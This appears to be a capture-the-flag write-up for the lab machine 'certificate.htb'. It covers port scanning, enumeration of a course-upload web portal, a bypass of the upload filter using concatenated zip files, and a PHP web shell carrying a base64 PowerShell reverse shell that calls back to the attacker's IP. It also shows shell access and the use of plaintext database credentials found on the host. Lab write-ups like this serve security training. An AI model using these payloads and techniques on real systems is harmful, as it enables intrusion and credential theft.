# Host file setup
```python
❯❯❯ sudo nxc smb 10.129.245.51 --generate-hosts-file /etc/hosts 
SMB         10.129.245.51   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumerationm
## Open ports
```python
❯❯❯ nmap -p- --min-rate=2000 -sT -Pn dc01.certificate.htb -vv

Nmap scan report for dc01.certificate.htb (10.129.245.51)
Host is up, received user-set (0.014s latency).
rDNS record for 10.129.245.51: DC01.certificate.htb
Scanned at 2026-11-03 18:01:27 GMT for 66s
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49666/tcp open  unknown          syn-ack
49693/tcp open  unknown          syn-ack
49695/tcp open  unknown          syn-ack
49697/tcp open  unknown          syn-ack
49716/tcp open  unknown          syn-ack
56747/tcp open  unknown          syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 66.20 seconds
```

## Nmap
```python
❯❯❯ nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -sT -Pn dc01.certificate.htb
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-03 18:04 +0000
Nmap scan report for dc01.certificate.htb (10.129.245.51)
Host is up (0.014s latency).
rDNS record for 10.129.245.51: DC01.certificate.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-title: Certificate | Your portal for certification
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-04 02:04:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-04T02:05:17+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certificate.htb, DNS:certificate.htb, DNS:CERTIFICATE
| Not valid before: 2026-03-12T20:45:13
|_Not valid after:  2106-03-12T20:45:13
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-04T02:05:17+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certificate.htb, DNS:certificate.htb, DNS:CERTIFICATE
| Not valid before: 2026-03-12T20:45:13
|_Not valid after:  2106-03-12T20:45:13
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-04T02:05:17+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certificate.htb, DNS:certificate.htb, DNS:CERTIFICATE
| Not valid before: 2026-03-12T20:45:13
|_Not valid after:  2106-03-12T20:45:13
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-04T02:05:17+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certificate.htb, DNS:certificate.htb, DNS:CERTIFICATE
| Not valid before: 2026-03-12T20:45:13
|_Not valid after:  2106-03-12T20:45:13
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (95%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows 10 1903 - 22H2 (91%), Microsoft Windows 10 1909 - 2004 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)

Null auth enabled by default with DCs however cannot use it to enumerate

The guest account is also disabled

# HTTP (80)

![1111](Pasted%20image%2020261103181007.png)

Ill have a look around the site

The blog page has several potential users

```python
charlie barber 
mark wiens
ben frank
carol wood
```

I can also register and login to the page

Nothing interesting on the login page, so i think the best next step is to create an account

![](Pasted%20image%2020261103183057.png)

Looks like i can choose the account type i create, if i create teacher i will need to tell support to activate it

This will be through the contact page

![](Pasted%20image%2020261103183433.png)

Ill create an account for both account types

![](Pasted%20image%2020261103183800.png)

Now after logging in i can reach this endpoint

![](Pasted%20image%2020261103183859.png)

Each page has a different trainer name

There is also a feedback section which is interesting

Looks like there is 4 courses available `?id=1-4`

```python
lorra armessa
havok watterson
sara laracrof
john wood
```

These are the trainer names from each of the courses

Ill try enrolling and testing the feedback option

Enrolling in the course gives me access to course content

![](Pasted%20image%2020261103193306.png)

There are certain parts of the course with file submission

It also says the file will be inspected by the course instructor

![](Pasted%20image%2020261103193522.png)

Uploading a .txt file shows an invalid MIME type error

# Reverse shell

![](Pasted%20image%2020261103194429.png)

Ill upload a valid file format such as a pdf and i see there is a built in viewer

![](Pasted%20image%2020261103194501.png)

This is where they are stored, i can try a PHP web shell here

After testing its behavior i see that the zip file is the best bet, this is becuase the zip file bypasses any extension checks and content-type checks

```python
❯❯❯ zip -r shell.zip shell.php default.pdf
```

I zipped a php web shell with a example pdf 

After uploading i get a 400 error, this is likely because its detecting the file type .php after unzipping

But by uploading a .zip it bypasses content-type and extension checks

```python
<?php
shell_exec('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAxACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==');
?>
```

This is the contents of shell.php, i just grabbed the powershell base64 shell from revshells

```python
❯❯❯ zip -r default.zip default.pdf                                                   
  adding: default.pdf (deflated 51%)
  
❯❯❯ zip -r shell.zip shell.php               
  adding: shell.php (stored 0%)
```

Ill zip both of these files individually

```python
❯❯❯ cat default.zip shell.zip > rce.zip
```

Then ill cat both files out with the .pdf file first then put this in a zip file

![](Pasted%20image%2020261103201938.png)

The upload succeeds

```python
❯❯❯ rlwrap nc -lnvp 1337
listening on [any] 1337 ...
```

Ill start a listener

Then ill click the link to open the upload, it takes me to the pdf in the URL, so ill just change it from `default.pdf` to `shell.php`

![](Pasted%20image%2020261103203632.png)

I now have a shell

```python
PS C:\xampp\htdocs\certificate.htb> dir


    Directory: C:\xampp\htdocs\certificate.htb


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       12/26/2024   1:49 AM                static                                                                
-a----       12/24/2024  12:45 AM           7179 about.php                                                             
-a----       12/30/2024   1:50 PM          17197 blog.php                                                              
-a----       12/30/2024   2:02 PM           6560 contacts.php                                                          
-a----       12/24/2024   6:10 AM          15381 course-details.php                                                    
-a----       12/24/2024  12:53 AM           4632 courses.php                                                           
-a----       12/23/2024   4:46 AM            549 db.php                                                                
-a----       12/22/2024  10:07 AM           1647 feature-area-2.php                                                    
-a----       12/22/2024  10:22 AM           1331 feature-area.php                                                      
-a----       12/22/2024  10:16 AM           2955 footer.php                                                            
-a----       12/23/2024   5:13 AM           2351 header.php                                                            
-a----       12/24/2024  12:52 AM           9497 index.php                                                             
-a----       12/25/2024   1:34 PM           5908 login.php                                                             
-a----       12/23/2024   5:14 AM            153 logout.php                                                            
-a----       12/24/2024   1:27 AM           5321 popular-courses-area.php                                              
-a----       12/25/2024   1:27 PM           8240 register.php                                                          
-a----       12/28/2024  11:26 PM          10366 upload.php                                                            


PS C:\xampp\htdocs\certificate.htb>
```

Ill look into `db.php`

![](Pasted%20image%2020261103203900.png)

There is credentials stored here

Checking internal ports 3306 is open, which indicated mysql

```python
PS C:\xampp\htdocs\certificate.htb> net user

User accounts for \\DC01

-------------------------------------------------------------------------------
Administrator            akeder.kh                Alex.D                   
Aya.W                    Eva.F                    Guest                    
John.C                   Kai.X                    kara.m                   
karol.s                  krbtgt                   Lion.SK                  
Maya.K                   Nya.S                    Ryan.K                   
saad.m                   Sara.B                   xamppuser                
The command completed successfully.

PS C:\xampp\htdocs\certificate.htb>
```

Also these are the users

# Lateral movement

```python
PS C:\xampp\htdocs\certificate.htb> C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p'cert!f!c@teDBPWD' -e "SHOW DATABASES;"
Database
certificate_webapp_db
information_schema
test
PS C:\xampp\htdocs\certificate.htb> 
```

